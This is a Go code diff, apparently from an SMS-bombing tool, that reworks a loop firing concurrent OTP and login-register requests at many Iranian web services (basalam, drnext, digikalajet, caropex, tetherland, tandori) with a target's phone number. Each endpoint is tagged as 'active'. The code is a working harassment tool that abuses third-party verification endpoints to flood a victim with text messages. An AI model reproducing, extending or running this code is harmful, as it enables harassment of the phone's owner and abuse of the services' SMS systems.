@@ -341,28 +341,36 @@ func main() {
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-		go sms("https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
+		// irantic.com
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
 			"mobile": phone,
-		}, ch)  // add site   // active ✅
-		s26 := fmt.Sprintf("'variables': {'mobile': %s,'query': 'mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }'", phone)
-		go sms("https://api.basalam.com/user", map[string]interface{}{
-			s26: phone,
-		}, ch)  // active ✅
-		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
+		}, &wg, ch)  // active ✅		
+		// irantic.com
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
 			"mobile": phone,
-		}, ch)   // active ✅
-		go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
+		}, &wg, ch)  // active ✅
+		// irantic.com
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
 			"phone": phone,
-		}, ch)   // add site  // active ✅
-		go sms("https://caropex.com/api/v1/user/login", map[string]interface{}{
+		}, &wg, ch)  // active ✅
+		// irantic.com
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{
 			"mobile": phone,
-		}, ch)    // add site  // active ✅
-		go sms("https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
+		}, &wg, ch)  // active ✅
+		// irantic.com
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
 			"mobile": phone,
-		}, ch)    // add site  // active ✅
-		go sms("https://api.tandori.ir/client/users/login", map[string]interface{}{
+		}, &wg, ch)  // active ✅
+		// irantic.com
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.tandori.ir/client/users/login", map[string]interface{}{
 			"phone": phone,
-		}, ch)  // active ✅
+		}, &wg, ch)  // active ✅
 	}
 
 	go func() {
